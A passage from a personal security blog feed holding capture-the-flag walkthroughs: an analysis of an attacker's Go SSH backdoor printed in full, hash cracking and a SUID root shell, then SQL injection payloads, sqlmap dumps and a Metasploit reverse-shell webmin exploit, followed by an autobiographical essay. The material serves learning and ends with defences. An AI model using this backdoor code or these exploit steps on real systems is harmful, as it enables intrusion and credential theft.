+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Panicln</span>(<span style="color:#e6db74">&#34;Error reading privkey:\t&#34;</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">privateKey</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">gossh</span>.<span style="color:#a6e22e">ParsePrivateKey</span>(<span style="color:#a6e22e">privKeyBytes</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Panicln</span>(<span style="color:#e6db74">&#34;Error parsing privkey:\t&#34;</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">server</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Server</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Addr</span>:            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%s:%v&#34;</span>, <span style="color:#a6e22e">lhost</span>.<span style="color:#a6e22e">String</span>(), <span style="color:#a6e22e">lport</span>),
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Handler</span>:         <span style="color:#a6e22e">sshterminal</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Version</span>:         <span style="color:#a6e22e">fingerprint</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">PasswordHandler</span>: <span style="color:#a6e22e">passwordHandler</span>,
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">AddHostKey</span>(<span style="color:#a6e22e">privateKey</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Started SSH backdoor on&#34;</span>, <span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">Addr</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">ListenAndServe</span>())
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">verifyPass</span>(<span style="color:#a6e22e">hash</span>, <span style="color:#a6e22e">salt</span>, <span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">bool</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">resultHash</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">hashPassword</span>(<span style="color:#a6e22e">password</span>, <span style="color:#a6e22e">salt</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">resultHash</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">hash</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">hashPassword</span>(<span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">salt</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">string</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">hash</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sha512</span>.<span style="color:#a6e22e">Sum512</span>([]byte(<span style="color:#a6e22e">password</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">salt</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%x&#34;</span>, <span style="color:#a6e22e">hash</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">sshHandler</span>(<span style="color:#a6e22e">s</span> <span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Session</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">command</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">RawCommand</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">runCommand</span>(<span style="color:#a6e22e">command</span>))
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">term</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">terminal</span>.<span style="color:#a6e22e">NewTerminal</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;$ &#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">command</span>, <span style="color:#a6e22e">_</span> = <span style="color:#a6e22e">term</span>.<span style="color:#a6e22e">ReadLine</span>()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;exit&#34;</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">term</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">runCommand</span>(<span style="color:#a6e22e">command</span>))
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">sshterminal</span>(<span style="color:#a6e22e">s</span> <span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Session</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ptyReq</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">isPty</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Pty</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">isPty</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Env</span> = append(<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Env</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;TERM=%s&#34;</span>, <span style="color:#a6e22e">ptyReq</span>.<span style="color:#a6e22e">Term</span>))
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">pty</span>.<span style="color:#a6e22e">Start</span>(<span style="color:#a6e22e">cmd</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>			panic(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">s</span>) <span style="color:#75715e">// stdin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		}()
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">f</span>) <span style="color:#75715e">// stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Wait</span>()
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;No PTY requested.\n&#34;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">runCommand</span>(<span style="color:#a6e22e">cmd</span> <span style="color:#66d9ef">string</span>) []<span style="color:#66d9ef">byte</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">result</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#a6e22e">cmd</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">CombinedOutput</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">passwordHandler</span>(<span style="color:#a6e22e">_</span> <span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">bool</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">verifyPass</span>(<span style="color:#a6e22e">hash</span>, <span style="color:#e6db74">&#34;1c362db832f3f864c8c2fe05f2002a05&#34;</span>, <span style="color:#a6e22e">password</span>)
+</span></span></code></pre></div><p>we can see that the program first assigns a default hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hash</span> <span style="color:#66d9ef">string</span> = <span style="color:#e6db74">&#34;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3&#34;</span>
+</span></span></code></pre></div><p>as we proceed further, there&rsquo;s a function called <code>verifyPass</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">verifyPass</span>(<span style="color:#a6e22e">hash</span>, <span style="color:#a6e22e">salt</span>, <span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>)
+</span></span></code></pre></div><p>towards the bottom of the program, we see that a hardcoded salt is passed to the function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">passwordHandler</span>(<span style="color:#a6e22e">_</span> <span style="color:#a6e22e">ssh</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">password</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">bool</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">verifyPass</span>(<span style="color:#a6e22e">hash</span>, <span style="color:#e6db74">&#34;1c362db832f3f864c8c2fe05f2002a05&#34;</span>, <span style="color:#a6e22e">password</span>)
+</span></span></code></pre></div><p>do you remember the hash the attacker used to login to the backdoor? that hash had this salt hardcoded onto it. identifying the attacker&rsquo;s hash as <code>SHA512($pass.$salt)</code>, we can now try crack it. this time, i used hashcat:</p>
+<pre tabindex="0"><code>hashcat.exe -a 0 -m 1710 &#34;6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05&#34; C:\rockyou.txt --force
+</code></pre><p>the password we get after the hash is cracked is &ldquo;november16&rdquo;.</p>
+<p>let&rsquo;s now login to the attacker&rsquo;s backdoor. our target IP is 10.10.12.175, and the backdoor was running on port 2222:</p>
+<pre tabindex="0"><code>ssh -p 2222 james@10.10.12.175
+</code></pre><p><img src="/overpass-backdoor.png" alt="backdoor"></p>
+<p>we are logged in as james, into the backdoor, and we can access the user.txt flag.</p>
+<p>while we&rsquo;re here, let&rsquo;s run <code>ls -la</code> and see what we get.</p>
+<p><img src="/overpass-backdoor2.png" alt="backdoor"></p>
+<p>we can see a root process called <code>.suid_bash</code>. a quick google search shows that this little exploit opens a bash shell as root, meaning although an attacker may not be root, running the process will give them the effective privileges of root.</p>
+<p><img src="/overpass-suidbash.png" alt="bash"></p>
+<p>so let&rsquo;s run this process by typing <code>./.suid_bash -p</code> and get the root flag.</p>
+<p><img src="/overpass-suidbash2.png" alt="backdoor"></p>
+<p>uploading a php reverse shell via an upload form is a very simple and preventable attack vector. it can give an attacker direct access to the target. in this case, a backdoor was also set up, which should be prevented at all costs. a quick fix would have been to set up multiple firewalls (using iptables, ufw, or whichever linux firewall they choose) and having an implicit deny for all traffic other than what is specifically allowed.</p>
+<p>a proxy with deep packet inspection capabilities, and which intercepts SSL/TLS connections and blocks any suspicious outbound traffic would also have helped. a simpler solution is to disable the ability for executables to run from temp directories.</p>
+<p>finally, if your company wants to spend the time in understanding and implementing software restriction policies, which only allow known executables to run, that is the best solution.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>tryhackme: game zone</title>
+            <link>/posts/2021/10/tryhackme-game-zone/</link>
+            <pubDate>Tue, 26 Oct 2021 17:21:48 +0400</pubDate>
+            
+            <guid>/posts/2021/10/tryhackme-game-zone/</guid>
+            <description>this is a walkthrough for the room &amp;ldquo;game zone&amp;rdquo; on tryhackme. this was the 4th room in the &amp;ldquo;advanced exploitation&amp;rdquo; chapter, part of the &amp;ldquo;offensive pentesting&amp;rdquo; path.
+i liked this room because i like sql (yes, i know). database security is a very important component of cybersecurity, as databases are used in almost every type of modern organization. at the end of the walkthrough, i&amp;rsquo;ll also include a link to a resource about preventing database attacks.</description>
+            <content type="html"><![CDATA[<p>this is a walkthrough for the room &ldquo;game zone&rdquo; on tryhackme. this was the 4th room in the &ldquo;advanced exploitation&rdquo; chapter, part of the &ldquo;offensive pentesting&rdquo; path.</p>
+<p>i liked this room because i like sql (yes, i know). database security is a very important component of cybersecurity, as databases are used in almost every type of modern organization. at the end of the walkthrough, i&rsquo;ll also include a link to a resource about preventing database attacks.</p>
+<p>tun0 IP address: 10.9.6.194
+target IP address: 10.10.141.141</p>
+<p>the first thing i always do, is to get an nmap scan going on the target. while that&rsquo;s running, i try to visit the IP address, in case it&rsquo;s a web page.</p>
+<p>the nmap scan:</p>
+<pre tabindex="0"><code>nmap -sV -Pn 10.10.141.141 -v -T4
+</code></pre><p>i want a very quick, one shot enumeration of the open ports and what services they are running.</p>
+<p>keep in mind that i&rsquo;m not doing a UDP scan on this network. from my experience, they usually don&rsquo;t bring any more information. rarely, you might discover and have to use some open UDP ports.</p>
+<p>visiting the IP address takes us to a website.</p>
+<p><img src="/landingpage.png" alt="landing page"></p>
+<p>the first question of the room is:</p>
+<blockquote>
+<p>What is the name of the large cartoon avatar holding a sniper on the forum?</p>
+</blockquote>
+<p>i just happen to know the name of this character. if you don&rsquo;t, you can download the image and do a reverse image search. the search will lead you to the name of the video game: hitman. if you google hitman, you&rsquo;ll know the name of the protagonist (the dude in the photo) is Agent 47.</p>
+<p>let&rsquo;s check back on our nmap scan.</p>
+<p><img src="/nmap1.png" alt="nmap"></p>
+<p>we have 2 open ports, according to this scan: port 22 (SSH) and port 80 (HTTP). port 80 is obviously the website. let&rsquo;s dig around on the website a bit more.</p>
+<p>as we can see on the landing page, there&rsquo;s a login form. we have 2 options here: either try to use SQL injection (sqli), or try to brute force the login form if sqli is not possible.</p>
+<p>a login SQL query usually looks something like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user&#34;</span> <span style="color:#66d9ef">AND</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pass&#34;</span>
+</span></span></code></pre></div><p>what this query tries to do, is select the database table &ldquo;users&rdquo; and login with the credentials user:pass.</p>
+<p>SQLi can be used to break the query. this is usually done by using a string termination character (&rsquo;) along with a true boolean statement:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; OR 1=1 -- -
+</span></span></span></code></pre></div><p>it&rsquo;s usually some variation of the above. the dashes at the end indicate the start of a comment, which in this case would comment out the rest of the query.</p>
+<p>for example, if you entered &ldquo;admin&rdquo; as the username, and &ldquo;&rsquo; OR 1=1 &ndash; -&rdquo; as the password, our query would become:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">where</span> username <span style="color:#f92672">=</span> <span style="color:#66d9ef">admin</span> <span style="color:#66d9ef">AND</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; OR 1=1 -- -
+</span></span></span></code></pre></div><p>in a weak system that didn&rsquo;t sanitize user input, this would break the login query and log us in as admin, because the password is <strong>always true</strong>.
+let&rsquo;s try to login, but let&rsquo;s set the username as &ldquo;&rsquo; OR 1=1 &ndash; -&rdquo;</p>
+<p>it worked! the site took us to a page called &ldquo;portal.php&rdquo;.</p>
+<p><img src="/portal.png" alt="portal"></p>
+<p>it seems to be a form where you can search for a game review. hitting search with no game in the field shows us a list of the game reviews on the database.</p>
+<p><img src="/portal2.png" alt="portal2"></p>
+<p>let&rsquo;s try to search for a game and intercept the request in burp suite. we&rsquo;ll save the request as a text file, then feed it to sqlmap (an automated SQLi attack tool).</p>
+<p>the intercepted request:</p>
+<p><img src="/burp.png" alt="burp"></p>
+<p>i saved the request as burp.txt.</p>
+<p>in sqlmap, we can use the command:</p>
+<pre tabindex="0"><code>sqlmap -r burp.txt --dbms=mysql --dump
+</code></pre><p>what this will do is dump the contents of the entire database. this can be a very noisy operation, so i&rsquo;d advise against it.
+the more stealthy approach is to dump the info in little parts, starting with the databases, then the tables inside the databases, and finally the contents of the tables.</p>
+<pre tabindex="0"><code>sqlmap -r burp.txt --dbms=mysql --dbs
+</code></pre><p><img src="/databases.png" alt="databases"></p>
+<p>we can see 5 databases. &ldquo;information_schema&rdquo; and &ldquo;performance_schema&rdquo; are usually default generated databases, so let&rsquo;s focus on the database &ldquo;db&rdquo;.</p>
+<pre tabindex="0"><code>sqlmap -r burp.txt --dbms=mysql -D db --tables
+</code></pre><p><img src="/tables.png" alt="tables"></p>
+<p>there are 2 tables: post and users. obviously, you want to dump the contents of the user table to see if there are any hashes or plaintext passwords (rare) stored.</p>
+<pre tabindex="0"><code>sqlmap -r burp.txt --dbms=mysql -D db -T users --dump
+</code></pre><p><img src="/hash.png" alt="hash"></p>
+<p>there&rsquo;s a user (agent47), along with their password hash (ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14).</p>
+<p>what can we do with this hash? well, we can crack it! to crack it, you can either use john the ripper or hashcat. for this example, let&rsquo;s use john. before we do that though, we need to identify the hash. there are a variety of ways to identify hashes. you can either use an online hash identifier, like the one on <a href="https://hashes.com/en/tools/hash_identifier">hashes.com</a>, or you can tell from experience if you&rsquo;ve been exposed to hashes in the past. i just happen to know that this is a SHA256 hash, so let&rsquo;s work on cracking it with john. first, save the hash to a file.</p>
+<pre tabindex="0"><code>john agent47.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+</code></pre><p><img src="/john.png" alt="john"></p>
+<p>since i&rsquo;ve already performed this crack, the result has been cached and pops up right away for me. normally, you will have to wait a while as john proceeds through the wordlists provided. hashcat might be a better option in some cases, as it can harness your GPU&rsquo;s CUDA cores and crack the hashes a lot faster.</p>
+<p>so we now have the credentials agent47:videogamer124. what can we do with this information? if you remember the nmap scan at the beginning, there was an SSH service running on port 22. let&rsquo;s attempt to SSH into agent47&rsquo;s machine.</p>
+<pre tabindex="0"><code>ssh agent47@10.10.141.141
+</code></pre><p><img src="/userflag.png" alt="user_flag"></p>
+<p>we got our first flag! sweet. so, what now? in most cases, an attacker won&rsquo;t simply stop here. the primary goal of an attacker is to gain root/admin access.</p>
+<p>in the case of web applications like game zone, some services may be hidden behind firewalls. in some networks too, some websites may be blocked. what we can do in that case, is to create a reverse SSH tunnel that forwards the blocked traffic to a server that we own, then view it. -L is a local tunnel (YOU &lt;- CLIENT).</p>
+<p>first, we have to see the sockets that are running on a host.
+from inside the SSH terminal:</p>
+<pre tabindex="0"><code>ss -tulpn
+</code></pre><p>-t displays TCP sockets, -u displays UDP sockets, -l displays listening sockets, -p displays the process using the socket, -n makes sure the hostnames aren&rsquo;t resolved.</p>
+<p><img src="/tulpn.png" alt="sockets"></p>
+<p>we can see that there&rsquo;s a service running on port 10000. the service is hidden, meaning it&rsquo;s probably behind a firewall rule. since we&rsquo;re not root, we can&rsquo;t modify the iptables list. let&rsquo;s create a reverse SSH tunnel and make the service visible to us. on our local machine, run:</p>
+<pre tabindex="0"><code>ssh -L 10000:localhost:10000 agent47@10.10.141.141
+</code></pre><p>if you visit localhost:10000 in a browser, you&rsquo;ll now see the webmin login page that was previously hidden.</p>
+<p><img src="/webminlogin.png" alt="webmin"></p>
+<p>try logging in with agent47:videogamer124.</p>
+<p>it works! and we can see some system information about the service.</p>
+<p><img src="/webmininfo.png" alt="webmin_info"></p>
+<p>the most important thing here is the webmin version: 1.580. we can use this information to search for an exploit relating to this exact version. i like to use searchsploit, because we&rsquo;re going to use metasploit, but you can use google or any other exploit database to find it.</p>
+<p><img src="/searchsploit.png" alt="searchsploit"></p>
+<p>we&rsquo;re going to use the first result: /file/show.cgi Remote Command Execution. this exploits an arbitrary command execution vulnerability in our version of webmin. the vulnerability exists in /file/show.cgi and will allow an authenticated user (agent47) to execute arbitrary commands with root privileges.</p>
+<p>fire up msfconsole, and search for this exploit.</p>
+<p><img src="/msfconsole.png" alt="msfconsole"></p>
+<p>now, let&rsquo;s configure our exploit.</p>
+<pre tabindex="0"><code>set payload cmd/unix/reverse
+set PASSWORD videogamer124
+set USERNAME agent47
+set RHOSTS localhost
+set SSL false
+set LHOST 10.9.6.194
+set LPORT 4444
+run
+</code></pre><p>if the exploit is successful, we&rsquo;ll get a shell. remember, the reverse ssh tunnel needs to be running for this exploit to work. when you get the shell, upgrade to a proper shell by typing <code>shell</code>. we&rsquo;ll be in the /usr/share/webmin/file directory, and the root flag is stored at /root/root.txt.</p>
+<p><img src="/root.png" alt="root"></p>
+<p>so there it is. we used SQLi to get initial, low privilege access to the network. after some poking around and reverse SSH tunneling, we discovered a CMS called webmin, that had a pretty neat little exploit specific to its version.</p>
+<p>how can we prevent SQLi and the host of issues it can open up a private network to?</p>
+<ol>
+<li>input validation</li>
+<li>parametrized queries</li>
+<li>stored procedures</li>
+<li>escaping</li>
+<li>avoiding administrative privileges</li>
+<li>web application firewalls (WAF)</li>
+</ol>
+<p><a href="https://www.ptsecurity.com/ww-en/analytics/knowledge-base/how-to-prevent-sql-injection-attacks/">this</a> article from ptsecurity breaks down the above prevention methods quite well, and everyone working with databases that contain loads of secure data would be well advised to follow them!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>intro to hacking</title>
+            <link>/posts/2021/10/intro-to-hacking/</link>
+            <pubDate>Sun, 24 Oct 2021 01:43:33 -0500</pubDate>
+            
+            <guid>/posts/2021/10/intro-to-hacking/</guid>
+            <description>over the past year, i felt something i haven&amp;rsquo;t felt in a long time. passion, for a new hobby and possibly a new field of work: cybersecurity. more specifically, pen(etration)testing.
+the story is pretty boring. as a kid, i was fascinated by computers. then, like so many young wannabe hackers, i watched &amp;ldquo;the matrix&amp;rdquo; and i became even more fascinated. not so much by computers, but rather how to get into computers and networks i&amp;rsquo;m not supposed to.</description>
+            <content type="html"><![CDATA[<p>over the past year, i felt something i haven&rsquo;t felt in a long time. passion, for a new hobby and possibly a new field of work: cybersecurity. more specifically, pen(etration)testing.</p>
+<p>the story is pretty boring. as a kid, i was fascinated by computers. then, like so many young wannabe hackers, i watched &ldquo;the matrix&rdquo; and i became even more fascinated. not so much by computers, but rather how to get into computers and networks i&rsquo;m not supposed to.</p>
+<h3 id="before">before</h3>
+<p>i grew up in the uae. the emirate of sharjah, to be precise. my mother was a professor in the university, and as such we had to live in the faculty housing on campus. the campus was connected as an intranet (a really big private network), so the already restricted internet access of the uae was restricted even further. this meant that i had no access to torrenting applications, online gaming, and, of course, other&hellip;<em>sites</em> that i wanted to visit very much but was simply not allowed to. friends of mine, who weren&rsquo;t in the intranet, had access to torrenting apps and online gaming, so it was just another thing i seemed to be left out of. for a long time, we hung out in internet/gaming cafes, gaming for hours and downloading whatever we wanted. my biggest weaknesses at the time, and even now, were music and movies. streaming didn&rsquo;t exist at the time so my options were either a) get it all at a cafe, using blazingly-fast (at the time) DSL or b) have a friend burn me CDs/DVDs with all the stuff i wanted. far from ideal.</p>
+<p>over time, a proxy server and early vpn known as hotspotshield became popular for, y&rsquo;know, <em>stuff</em>, and everyone seemed to be using it. i tried to use it to torrent but in our intranet, it was either throttled to be unusable and eventually blacklisted. so what did i end up doing? why, learning linux of course!</p>
+<p>someday, i&rsquo;ll have to find and thank the person who got me interested in such things. he was, and probably still is, a massive geek with an almost unbelievable memory and penchant for all things computer-related. he taught me how to use linux (ubuntu) and connect via ssh to a host he&rsquo;d set up somewhere (don&rsquo;t know how) outside the country. this was my first experience with virtualization, ssh, and properly configured vpns that would maintain my anonymity (i thought) and provide a usable connection speed that could also be used for gaming and torrenting. i was elated. suddenly, i had broken out of the restrictions that i had halfway accepted and the entire internet was at my fingertips. emphasis on <strong>entire</strong>.</p>
+<p>eventually, the remote host died for good and i lost access to the proxy. bummer. by that point, i had figured out (with the help of another student at my school who also happened to be my neighbour), how to enumerate and access smb shares on the intranet. as you may know, university campuses almost always had some version of a massive file sharing app like dc++ running, where students could freely share movies and music. dc++ didn&rsquo;t exactly work for us, maybe because we weren&rsquo;t connected to the student network, but somehow we could view some public smb shares where some students had set up their shared folders. once we had that, it was almost better than torrenting. of course, the music was never up to my standards but there was always a metalhead somewhere in the mix from whom i&rsquo;d copy (steal) music.</p>
+<p>i ended up leaving the country to study in canada and my access widened, so my early foray into hacking went limp and then died. i majored in electrical engineering, so the hacking was mostly physical. i learned a lot about assembly and memory, on a physical but still somewhat abstract level. learning electronics was also fun, but i didn&rsquo;t really care for it. however, i finished my degree and ended up getting a job as a software and database developer.</p>
+<p>coding was never something i was super into, beyond an aesthetic appreciation. it was kinda cool, and that was about it. it was also the career of choice for many engineers who couldn&rsquo;t stand their original discipline and just wanted a job. i was one of them, and here i was.</p>
+<h3 id="now">now</h3>
+<p>when the pandemic hit, i felt boredom on a metaphysical level. i&rsquo;m the kind of person who already gets easily bored, so being made to stay at home and do something i only halfway enjoyed was not it. i wanted to do something different, something exciting. but what?</p>
